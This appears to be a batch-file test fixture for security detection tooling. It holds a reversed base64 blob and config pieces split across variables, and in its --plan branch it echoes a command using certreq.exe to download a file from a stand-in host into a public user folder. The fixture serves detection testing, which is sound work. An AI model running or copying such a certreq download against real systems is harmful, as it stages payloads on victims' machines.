@echo off
setlocal EnableExtensions EnableDelayedExpansion
rem HUNTRESS-CODEC:reversed_text|identity
rem HUNTRESS-MATERIAL:==AdhRmL4QGMwIGOxQTNk1SZnFGdzxlYhx0czVmc05WdIx1YpxmY1BFXzJXZzVFX6MUPoRXYw9VZslmZ8RXYk5iZjhjNxIWY18CZpxWY25WauUGbw1WY4VmL4QGMwIGOxQTNk9yL6MHc0RHa9wmc1xHOkBDMihTM0UDZt42ZpFGctF2Y9QWaf52ZpFGctF2Y8Vmbv5WPldWY1dmbhx2X0hXZuxXZsdmbpNXPoBXYydGfx0DduV3bj9VZnFGdzxXZ4VmLxVmc0JXZj1jclRHchRWY8VGbpZ2XlRXaydHLlR3btVmcfVmcpVXcjFWPzBXZ0NHfx0jd
rem analyst reconstruction fixture
rem HUNTRESS-EXTENSION:cmd
if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT
if /i "%~1"=="--plan" goto :HUNTRESS_PLAN
exit /b 0
:HUNTRESS_INSPECT
set v_a0=v=1^|steps=acquire_remote,write_file^|adapter=certreq.exe^|stage
set v_a1=_count=1^|graph=single^|next_language=none^|campaign_id=campaign
set v_a2=-d5418b00d8^|url=https://d5418b00d8.example.invalid/5ab168cf.d
set v_a3=at^|file_path=C:\Users\Public\HuntressLab\stage-d5418b00d8.dat
goto :HUNTRESS_SEPARATOR_DONE
ver >nul & rem HUNTRESS separator ampersand
:HUNTRESS_SEPARATOR_DONE
set "neutral_environment_probe=cb7b6296"
set "HUNTRESS_READY=1"
if defined HUNTRESS_READY set "cfg=%v_a0%%v_a1%%v_a2%%v_a3%"
echo(!cfg!
exit /b 0
:HUNTRESS_PLAN
echo certreq.exe acquire https://d5418b00d8.example.invalid/5ab168cf.dat to C:\Users\Public\HuntressLab\stage-d5418b00d8.dat
exit /b 0
